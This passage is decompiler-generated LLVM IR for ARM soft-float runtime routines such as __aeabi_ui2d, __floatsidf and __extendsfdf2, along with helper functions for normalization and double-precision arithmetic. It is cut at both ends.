  uselistorder label %dec_label_pc_1dc34._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1dc34, { 0, 2, 1 }
}

define i32 @function_1dc68() local_unnamed_addr {
dec_label_pc_1dc68:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_1dc68 = load i32, i32* @r1, align 4
  %v2_1dc68 = icmp eq i32 %v0_1dc68, 0
  br i1 %v2_1dc68, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_1dc68
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_1dc68
  %v1_1dc7410 = load i32, i32* @r0, align 4
  store i32 %v1_1dc7410, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_1dcd0 = phi i32 [ %v0_1dc68, %bb ], [ %v1_1dc7410, %bb38 ]
  %v1_1dc88 = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_1dc80 = icmp ugt i32 %v0_1dcd0, 65535
  br i1 %v2_1dc80, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_1dc84 = and i32 %v0_1dcd0, 32768
  %v3_1dc84 = icmp eq i32 %v2_1dc84, 0
  %v4_1dc84 = udiv i32 %v0_1dcd0, 65536
  br i1 %v3_1dc84, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_1dc88 = add nsw i32 %v1_1dc88, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_1dc94 = phi i32 [ %v1_1dc88, %.thread ], [ %v1_1dc88, %bb39 ], [ %v2_1dc88, %bb40 ]
  %v1_1dc90 = phi i32 [ %v0_1dcd0, %.thread ], [ %v4_1dc84, %bb39 ], [ %v4_1dc84, %bb40 ]
  %v2_1dc8c = icmp ugt i32 %v1_1dc90, 255
  br i1 %v2_1dc8c, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_1dc90 = and i32 %v1_1dc90, 128
  %v3_1dc90 = icmp eq i32 %v2_1dc90, 0
  %v4_1dc90 = udiv i32 %v1_1dc90, 256
  br i1 %v3_1dc90, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
  %v2_1dc94 = add nsw i32 %v1_1dc94, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_1dca0 = phi i32 [ %v1_1dc94, %.thread3 ], [ %v1_1dc94, %bb41 ], [ %v2_1dc94, %bb42 ]
  %v1_1dc9c = phi i32 [ %v1_1dc90, %.thread3 ], [ %v4_1dc90, %bb41 ], [ %v4_1dc90, %bb42 ]
  %v2_1dc98 = icmp ugt i32 %v1_1dc9c, 15
  br i1 %v2_1dc98, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_1dc9c = and i32 %v1_1dc9c, 8
  %v3_1dc9c = icmp eq i32 %v2_1dc9c, 0
  %v4_1dc9c = udiv i32 %v1_1dc9c, 16
  br i1 %v3_1dc9c, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_1dca0 = add nsw i32 %v1_1dca0, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_1dca8 = phi i32 [ %v1_1dca0, %.thread4 ], [ %v1_1dca0, %bb43 ], [ %v2_1dca0, %bb44 ]
  %v1_1dcb0 = phi i32 [ %v1_1dc9c, %.thread4 ], [ %v4_1dc9c, %bb43 ], [ %v4_1dc9c, %bb44 ]
  %v2_1dca4 = icmp ugt i32 %v1_1dcb0, 3
  br i1 %v2_1dca4, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_1dca8 = add i32 %v1_1dca8, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_1dcac = udiv i32 %v1_1dcb0, 2
  %v6_1dcac = sub i32 %v1_1dca8, %v5_1dcac
  br label %bb46

bb46:                                             ; preds = %bb45, %.thread6
  %v0_1dcb0 = phi i32 [ %v6_1dcac, %.thread6 ], [ %v2_1dca8, %bb45 ]
  %v4_1dcb0 = udiv i32 %v1_1dcb0, 8
  %v5_1dcb0 = sub i32 %v0_1dcb0, %v4_1dcb0
  %v2_1dcb4 = add i32 %v5_1dcb0, -32
  %v4_1dcb4 = sub i32 31, %v5_1dcb0
  %v5_1dcb4 = and i32 %v4_1dcb4, %v5_1dcb0
  %v8_1dcb4 = icmp eq i32 %v5_1dcb0, 32
  %v6_1dcb8 = icmp slt i32 %v5_1dcb0, 32
  br i1 %v6_1dcb8, label %dec_label_pc_1dcbc, label %dec_label_pc_1dcdc

dec_label_pc_1dcbc:                               ; preds = %bb46
  %v2_1dcbc = add i32 %v5_1dcb0, -20
  %v7_1dcc0 = icmp sgt i32 %v2_1dcb4, -12
  br i1 %v7_1dcc0, label %dec_label_pc_1dcc4, label %dec_label_pc_1dcd8

dec_label_pc_1dcc4:                               ; preds = %dec_label_pc_1dcbc
  %v1_1dcc8 = sub i32 32, %v5_1dcb0
  %v6_1dccc = shl i32 %v0_1dcd0, %v5_1dcb0
  store i32 %v6_1dccc, i32* @r0, align 4
  %v6_1dcd0 = lshr i32 %v0_1dcd0, %v1_1dcc8
  store i32 %v6_1dcd0, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_1dcd8:                               ; preds = %dec_label_pc_1dcbc
  %v8_1dcbc = icmp eq i32 %v2_1dcbc, 0
  %v4_1dcbc = add i32 %v5_1dcb0, 2147483616
  %v5_1dcbc = and i32 %v2_1dcbc, %v4_1dcbc
  br label %dec_label_pc_1dcdc

dec_label_pc_1dcdc:                               ; preds = %bb46, %dec_label_pc_1dcd8
  %v1_1dce8.in = phi i32 [ %v2_1dcb4, %bb46 ], [ %v2_1dcbc, %dec_label_pc_1dcd8 ]
  %v6_1dce8 = phi i32 [ %v2_1dcb4, %bb46 ], [ %v5_1dcb0, %dec_label_pc_1dcd8 ]
  %v2_1dce8.in = phi i32 [ %v5_1dcb4, %bb46 ], [ %v5_1dcbc, %dec_label_pc_1dcd8 ]
  %v0_1dce8 = phi i1 [ %v8_1dcb4, %bb46 ], [ %v8_1dcbc, %dec_label_pc_1dcd8 ]
  %v1_1dce8 = icmp slt i32 %v1_1dce8.in, 0
  %v2_1dce8 = icmp slt i32 %v2_1dce8.in, 0
  %v3_1dcdc = xor i1 %v2_1dce8, %v1_1dce8
  %v4_1dcdc = or i1 %v0_1dce8, %v3_1dcdc
  br i1 %v4_1dcdc, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_1dcdc
  %v6_1dcdc = sub i32 32, %v6_1dce8
  store i32 %v6_1dcdc, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_1dcdc, %bb47
  %v6_1dce0 = shl i32 %v0_1dcd0, %v6_1dce8
  store i32 %v6_1dce0, i32* %r1.global-to-local, align 4
  br i1 %v4_1dcdc, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_1dce4 = load i32, i32* @r0, align 4
  %v7_1dce4 = load i32, i32* @ip, align 4
  %v12_1dce4 = lshr i32 %v6_1dce4, %v7_1dce4
  %v13_1dce4 = or i32 %v12_1dce4, %v6_1dce0
  store i32 %v13_1dce4, i32* %r1.global-to-local, align 4
  %v11_1dce8 = shl i32 %v6_1dce4, %v6_1dce8
  store i32 %v11_1dce8, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_1dcc4, %bb49
  %v6_1dcf0 = phi i32 [ %v6_1dcd0, %dec_label_pc_1dcc4 ], [ %v13_1dce4, %bb49 ], [ %v6_1dce0, %bb48 ]
  %v0_1dcec = load i32, i32* @r4, align 4
  %v2_1dcec = sub i32 %v0_1dcec, %v5_1dcb0
  store i32 %v2_1dcec, i32* %r4.global-to-local, align 4
  %v4_1dcec = xor i32 %v0_1dcec, %v5_1dcb0
  %v5_1dcec = xor i32 %v2_1dcec, %v0_1dcec
  %v6_1dcec = and i32 %v5_1dcec, %v4_1dcec
  %v7_1dcec = icmp slt i32 %v6_1dcec, 0
  %v8_1dcec = icmp slt i32 %v2_1dcec, 0
  %v5_1dcf0 = icmp slt i32 %v0_1dcec, %v5_1dcb0
  br i1 %v5_1dcf0, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_1dcf0 = mul i32 %v2_1dcec, 1048576
  %v11_1dcf0 = add i32 %v10_1dcf0, %v6_1dcf0
  %v7_1dcf4 = load i32, i32* @r5, align 4
  %v8_1dcf4 = or i32 %v7_1dcf4, %v11_1dcf0
  store i32 %v8_1dcf4, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_1dcfc = xor i1 %v8_1dcec, %v7_1dcec
  %v4_1dcfc = xor i1 %v3_1dcfc, true
  call void @__pseudo_cond_branch(i1 %v4_1dcfc, i32 %tmp33)
  %v0_1dd00 = load i32, i32* %r4.global-to-local, align 4
  %v2_1dd04 = sub i32 -32, %v0_1dd00
  store i32 %v2_1dd04, i32* %r4.global-to-local, align 4
  %v6_1dd08 = icmp sgt i32 %v0_1dd00, -32
  br i1 %v6_1dd08, label %dec_label_pc_1dd0c, label %dec_label_pc_1dd4c

dec_label_pc_1dd0c:                               ; preds = %.thread8
  %v1_1dd0c = add i32 %v2_1dd04, 12
  store i32 %v1_1dd0c, i32* %r4.global-to-local, align 4
  %v8_1dd10 = icmp sgt i32 %v1_1dd0c, 0
  br i1 %v8_1dd10, label %dec_label_pc_1dd30, label %dec_label_pc_1dd14

dec_label_pc_1dd14:                               ; preds = %dec_label_pc_1dd0c
  %v1_1dd14 = add i32 %v2_1dd04, 32
  %v1_1dd18 = sub i32 0, %v2_1dd04
  %v0_1dd1c = load i32, i32* @r0, align 4
  %v6_1dd1c = lshr i32 %v0_1dd1c, %v1_1dd14
  %v1_1dd20 = load i32, i32* %r1.global-to-local, align 4
  %v7_1dd20 = shl i32 %v1_1dd20, %v1_1dd18
  %v8_1dd20 = or i32 %v7_1dd20, %v6_1dd1c
  %v0_1dd24 = load i32, i32* @r5, align 4
  %v7_1dd24 = lshr i32 %v1_1dd20, %v1_1dd14
  %v8_1dd24 = or i32 %v0_1dd24, %v7_1dd24
  store i32 %v8_1dd24, i32* %r1.global-to-local, align 4
  %v2_1dd28 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1dd28, i32* %r4.global-to-local, align 4
  ret i32 %v8_1dd20

dec_label_pc_1dd30:                               ; preds = %dec_label_pc_1dd0c
  %v1_1dd30 = sub i32 0, %v2_1dd04
  %v1_1dd34 = add i32 %v2_1dd04, 32
  %v0_1dd38 = load i32, i32* @r0, align 4
  %v6_1dd38 = lshr i32 %v0_1dd38, %v1_1dd34
  %v1_1dd3c = load i32, i32* %r1.global-to-local, align 4
  %v7_1dd3c = shl i32 %v1_1dd3c, %v1_1dd30
  %v8_1dd3c = or i32 %v7_1dd3c, %v6_1dd38
  %v0_1dd40 = load i32, i32* @r5, align 4
  store i32 %v0_1dd40, i32* %r1.global-to-local, align 4
  %v2_1dd44 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1dd44, i32* %r4.global-to-local, align 4
  ret i32 %v8_1dd3c

dec_label_pc_1dd4c:                               ; preds = %.thread8
  %v0_1dd4c = load i32, i32* %r1.global-to-local, align 4
  %v6_1dd4c = lshr i32 %v0_1dd4c, %v2_1dd04
  %v0_1dd50 = load i32, i32* @r5, align 4
  store i32 %v0_1dd50, i32* %r1.global-to-local, align 4
  %v2_1dd54 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1dd54, i32* %r4.global-to-local, align 4
  ret i32 %v6_1dd4c

; uselistorder directives
  uselistorder i32 %v2_1dd04, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_1dcec, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1dcec, { 2, 0, 1, 3 }
  uselistorder i32 %v6_1dce0, { 1, 0, 2 }
  uselistorder i32 %v2_1dcb4, { 1, 0, 2 }
  uselistorder i32 %v5_1dcb0, { 6, 0, 5, 7, 3, 8, 2, 4, 9, 10, 1, 12, 11 }
  uselistorder i32 %v4_1dc9c, { 1, 0 }
  uselistorder i32 %v1_1dc9c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1dc90, { 1, 0 }
  uselistorder i32 %v1_1dc90, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1dc84, { 1, 0 }
  uselistorder i32 %v0_1dcd0, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 0, 8, 1, 6, 2, 7, 3, 4, 5, 9, 10 }
  uselistorder i32 -12, { 3, 1, 2, 4, 16, 17, 5, 19, 20, 6, 21, 22, 18, 15, 14, 13, 12, 11, 23, 24, 25, 26, 10, 7, 9, 8, 27, 28, 29, 0 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 9, 10, 11, 2, 4, 5, 3, 12, 13, 14, 0, 6, 8, 7, 15, 21, 20, 22, 23, 24, 17, 16, 19, 18, 1 }
  uselistorder i32 -4, { 10, 0, 1, 53, 11, 49, 12, 20, 73, 74, 75, 6, 21, 22, 23, 76, 77, 78, 7, 24, 25, 26, 79, 80, 81, 8, 27, 28, 82, 19, 18, 83, 84, 85, 17, 16, 15, 14, 29, 30, 31, 32, 33, 5, 34, 3, 35, 4, 86, 13, 36, 45, 46, 47, 48, 37, 38, 61, 62, 63, 9, 64, 65, 66, 39, 60, 2, 40, 54, 55, 56, 57, 58, 59, 67, 68, 69, 70, 71, 72, 41, 50, 51, 52, 42, 43, 44 }
  uselistorder i32 15, { 8, 9, 3, 15, 10, 11, 12, 13, 0, 16, 1, 19, 18, 2, 14, 4, 5, 6, 7, 17 }
  uselistorder i32 -8, { 11, 12, 1, 40, 19, 20, 21, 22, 23, 24, 18, 17, 10, 16, 15, 14, 13, 25, 26, 27, 28, 29, 9, 44, 45, 30, 31, 32, 33, 34, 43, 46, 35, 47, 39, 36, 37, 38, 2, 41, 42, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 128, { 13, 14, 8, 9, 6, 7, 10, 21, 20, 0, 1, 2, 11, 17, 18, 3, 4, 12, 19, 5, 16, 23, 15, 22 }
  uselistorder i32 255, { 8, 9, 5, 12, 13, 4, 6, 7, 11, 0, 1, 2, 3, 14, 10 }
  uselistorder i32 -16, { 2, 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 0, 22 }
  uselistorder i32 65536, { 1, 2, 3, 0, 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 29, 28, 30, 76, 75, 73, 77, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 74, 41, 43, 42, 44, 46, 45, 47, 48, 49, 50, 51, 53, 52, 54, 57, 56, 55, 58, 59, 60, 63, 62, 61, 64, 66, 67, 65, 68, 70, 71, 69, 72 }
  uselistorder i32 32768, { 3, 4, 2, 7, 0, 1, 6, 5 }
  uselistorder i32 65535, { 3, 4, 1, 2, 5, 0 }
  uselistorder i32 52, { 1, 18, 3, 21, 13, 14, 4, 19, 20, 26, 27, 2, 28, 0, 29, 30, 5, 6, 7, 9, 8, 10, 16, 23, 17, 15, 24, 11, 22, 25, 12 }
  uselistorder i32 20, { 5, 42, 43, 2, 8, 48, 0, 28, 44, 45, 15, 16, 17, 18, 41, 53, 9, 54, 55, 3, 56, 49, 10, 29, 30, 38, 39, 40, 19, 11, 20, 21, 1, 57, 6, 12, 58, 46, 47, 4, 7, 31, 32, 33, 34, 22, 50, 23, 24, 25, 26, 27, 35, 36, 37, 13, 51, 14, 52 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_1dcdc, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1dd5c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_1dd5c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1dd5c = load i32, i32* @r4, align 4
  %v2_1dd5c = icmp eq i32 %v0_1dd5c, 0
  %v1_1dd60 = xor i32 %arg3, 1048576
  store i32 %v1_1dd60, i32* @r3, align 4
  br i1 %v2_1dd5c, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_1dd5c
  %v1_1dd64 = load i32, i32* @r1, align 4
  %v2_1dd64 = xor i32 %v1_1dd64, 1048576
  store i32 %v2_1dd64, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_1dd5c
  %v1_1dd6c = load i32, i32* @r5, align 4
  %v2_1dd6c = add i32 %v1_1dd6c, -1
  store i32 %v2_1dd6c, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_1dd70 = call i32 @function_1dbb4()
  store i32 %v0_1dd70, i32* %r0.global-to-local, align 4
  %v0_1dd74 = load i32, i32* @r4, align 4
  %v0_1dd74.off = add i32 %v0_1dd74, 4194303
  %tmp = icmp ult i32 %v0_1dd74.off, 2097152
  %v1_1de04 = load i32, i32* @r5, align 4
  %v1_1de04.off = add i32 %v1_1de04, 4194303
  %tmp44 = icmp ult i32 %v1_1de04.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_1dd80

dec_label_pc_1dd80:                               ; preds = %bb30
  %v4_1dd80 = icmp eq i32 %v1_1de04, %v0_1dd74
  br i1 %v4_1dd80, label %bb31, label %dec_label_pc_1dd8c

bb31:                                             ; preds = %dec_label_pc_1dd80
  %v2_1dd84 = load i32, i32* @r2, align 4
  %v5_1dd84 = icmp eq i32 %v2_1dd84, %v0_1dd70
  br i1 %v5_1dd84, label %dec_label_pc_1dda0, label %dec_label_pc_1dd8c

dec_label_pc_1dd8c:                               ; preds = %dec_label_pc_1dd80, %bb31
  %v2_1dd8c = or i32 %v0_1dd74, %v0_1dd70
  %v4_1dd8c = icmp eq i32 %v2_1dd8c, 0
  br i1 %v4_1dd8c, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_1dd8c
  %v1_1dd94 = load i32, i32* @r2, align 4
  store i32 %v1_1dd94, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1dd8c, %bb32
  %v1_1dd9c = phi i32 [ %v0_1dd70, %dec_label_pc_1dd8c ], [ %v1_1dd94, %bb32 ]
  ret i32 %v1_1dd9c

dec_label_pc_1dda0:                               ; preds = %bb31
  %v0_1dda0 = load i32, i32* @r1, align 4
  %v1_1dda0 = load i32, i32* @r3, align 4
  %v4_1dda0 = icmp eq i32 %v1_1dda0, %v0_1dda0
  br i1 %v4_1dda0, label %dec_label_pc_1dda0..thread8_crit_edge, label %bb33

dec_label_pc_1dda0..thread8_crit_edge:            ; preds = %dec_label_pc_1dda0
  %v0_1ddb0.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_1dda0
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1dda0..thread8_crit_edge, %bb33
  %v0_1ddb0 = phi i32 [ %v0_1ddb0.pre, %dec_label_pc_1dda0..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_1ddb0 = xor i1 %v4_1dda0, true
  call void @__pseudo_cond_branch(i1 %v2_1ddb0, i32 %v0_1ddb0)
  %v0_1ddb4 = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_1ddb4, 2097152
  br i1 %tmp45, label %dec_label_pc_1ddbc, label %dec_label_pc_1ddd0

dec_label_pc_1ddbc:                               ; preds = %.thread8
  %v0_1ddbc = load i32, i32* %r0.global-to-local, align 4
  %v1_1ddbc = icmp slt i32 %v0_1ddbc, 0
  %v2_1ddbc = mul i32 %v0_1ddbc, 2
  store i32 %v2_1ddbc, i32* %r0.global-to-local, align 4
  %v0_1ddc0 = load i32, i32* @r1, align 4
  %v3_1ddc0 = mul i32 %v0_1ddc0, 2
  %v4_1ddc0 = zext i1 %v1_1ddbc to i32
  %v5_1ddc0 = or i32 %v3_1ddc0, %v4_1ddc0
  %v9_1ddc0 = icmp ule i32 %v5_1ddc0, %v0_1ddc0
  %v10_1ddc0 = icmp ult i32 %v3_1ddc0, %v0_1ddc0
  %v11_1ddc0 = select i1 %v1_1ddbc, i1 %v9_1ddc0, i1 %v10_1ddc0
  br i1 %v11_1ddc0, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_1ddbc
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_1ddbc, %bb34
  ret i32 %v2_1ddbc

dec_label_pc_1ddd0:                               ; preds = %.thread8
  %v2_1ddd0 = icmp ugt i32 %v0_1ddb4, -4194305
  br i1 %v2_1ddd0, label %dec_label_pc_1ddd0..thread9_crit_edge, label %bb36

dec_label_pc_1ddd0..thread9_crit_edge:            ; preds = %dec_label_pc_1ddd0
  %v0_1dddc.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_1ddd0
  %v1_1ddd4 = load i32, i32* @r1, align 4
  %v2_1ddd4 = add i32 %v1_1ddd4, 1048576
  store i32 %v2_1ddd4, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_1ddd0..thread9_crit_edge, %bb36
  %v0_1dddc = phi i32 [ %v0_1dddc.pre, %dec_label_pc_1ddd0..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_1dddc = xor i1 %v2_1ddd0, true
  call void @__pseudo_cond_branch(i1 %v2_1dddc, i32 %v0_1dddc)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_1de10.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_1de10.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_1ddfc = load i32, i32* @r3, align 4
  %v1_1de00 = load i32, i32* @r2, align 4
  store i32 %v1_1de00, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_1de1023 = phi i32 [ %v1_1de10.pre, %.thread14 ], [ %v1_1ddfc, %bb37 ]
  %v1_1de0c = phi i32 [ %v0_1dd70, %.thread14 ], [ %v1_1de00, %bb37 ]
  store i32 %v1_1de0c, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_1de1c = phi i32 [ %v1_1de1023, %bb38 ], [ %v1_1de10.pre, %.thread11 ]
  %v1_1de24 = phi i32 [ %v1_1de0c, %bb38 ], [ %v0_1dd70, %.thread11 ]
  %v4_1de10 = mul i32 %v1_1de1c, 4096
  %v5_1de10 = or i32 %v4_1de10, %v1_1de24
  %v7_1de10 = icmp eq i32 %v5_1de10, 0
  br i1 %v7_1de10, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_1de14 = load i32, i32* @r2, align 4
  %v2_1de14 = load i32, i32* @r3, align 4
  %v5_1de14 = mul i32 %v2_1de14, 4096
  %v6_1de14 = or i32 %v5_1de14, %v1_1de14
  %v8_1de14 = icmp eq i32 %v6_1de14, 0
  br i1 %v8_1de14, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_1de18 = icmp eq i32 %v2_1de14, %v1_1de1c
  br i1 %v5_1de18, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_1de24

; uselistorder directives
  uselistorder i32 %v1_1de10.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1ddc0, { 1, 2, 0 }
  uselistorder i32 %v2_1ddbc, { 1, 0 }
  uselistorder i1 %v1_1ddbc, { 1, 0 }
  uselistorder i32 %v0_1ddb4, { 1, 0 }
  uselistorder i1 %v4_1dda0, { 1, 0 }
  uselistorder i32 %v0_1dd74, { 2, 0, 1 }
  uselistorder i32 %v0_1dd70, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1dd8c, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1de28 = icmp eq i32 %arg1, 0
  br i1 %v2_1de28, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_1de30 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1de28, i32 %v0_1de30)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_1de48 = call i32 @function_1dc68()
  ret i32 %v0_1de48

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1de4c = icmp eq i32 %arg1, 0
  br i1 %v2_1de4c, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_1de54 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1de4c, i32 %v0_1de54)
  store i32 1074, i32* @r4, align 4
  %v1_1de64 = and i32 %arg1, -2147483648
  store i32 %v1_1de64, i32* @r5, align 4
  %v2_1de64 = icmp eq i32 %v1_1de64, 0
  br i1 %v2_1de64, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1de68 = sub i32 0, %arg1
  store i32 %v2_1de68, i32* @r0, align 4
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  store i32 0, i32* @r1, align 4
  %v0_1de70 = call i32 @function_1dc68()
  ret i32 %v0_1de70

; uselistorder directives
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v2_1de74 = mul i32 %arg1, 2
  store i32 %v2_1de74, i32* %r2.global-to-local, align 4
  %v4_1de74 = icmp eq i32 %v2_1de74, 0
  %v1_1de78 = and i32 %v2_1de74, 4
  %v2_1de78 = icmp ne i32 %v1_1de78, 0
  %v3_1de78 = sdiv i32 %v2_1de74, 8
  %v3_1de7c = zext i1 %v2_1de78 to i32
  %v6_1de7c = zext i32 %v3_1de78 to i64
  %v7_1de7c = sub nsw i32 33, %v3_1de78
  %v8_1de7c = zext i32 %v7_1de7c to i64
  %v9_1de7c = shl i64 %v6_1de7c, %v8_1de7c
  %v10_1de7c = sub nsw i32 32, %v3_1de78
  %v11_1de7c = shl i32 %v3_1de7c, %v10_1de7c
  %v12_1de7c = zext i32 %v11_1de7c to i64
  %v14_1de7c = or i64 %v12_1de7c, %v9_1de7c
  %v15_1de7c = trunc i64 %v14_1de7c to i32
  store i32 %v15_1de7c, i32* %r1.global-to-local, align 4
  %v3_1de80 = mul i32 %arg1, 536870912
  store i32 %v3_1de80, i32* @r0, align 4
  br i1 %v4_1de74, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_1de84 = and i32 %v2_1de74, -16777216
  store i32 %v2_1de84, i32* @r3, align 4
  %v4_1de84 = icmp eq i32 %v2_1de84, 0
  br i1 %v4_1de84, label %.thread1, label %bb7

bb7:                                              ; preds = %bb
  %v4_1de88 = icmp ugt i32 %v2_1de74, -16777217
  br i1 %v4_1de88, label %.thread1, label %bb8

bb8:                                              ; preds = %bb7
  %v2_1de8c = xor i32 %v15_1de7c, 939524096
  store i32 %v2_1de8c, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb7, %bb8
  %v1_1de90 = phi i1 [ false, %bb ], [ false, %bb7 ], [ true, %bb8 ], [ false, %entry ]
  %v0_1de90 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1de90, i32 %v0_1de90)
  %v0_1de94 = load i32, i32* %r2.global-to-local, align 4
  %v2_1de94 = icmp eq i32 %v0_1de94, 0
  br i1 %v2_1de94, label %bb10, label %bb9

bb9:                                              ; preds = %.thread1
  %v1_1de98 = load i32, i32* @r3, align 4
  %v4_1de98 = icmp eq i32 %v1_1de98, -16777216
  br label %bb10

bb10:                                             ; preds = %.thread1, %bb9
  %v1_1de9c = phi i1 [ true, %.thread1 ], [ %v4_1de98, %bb9 ]
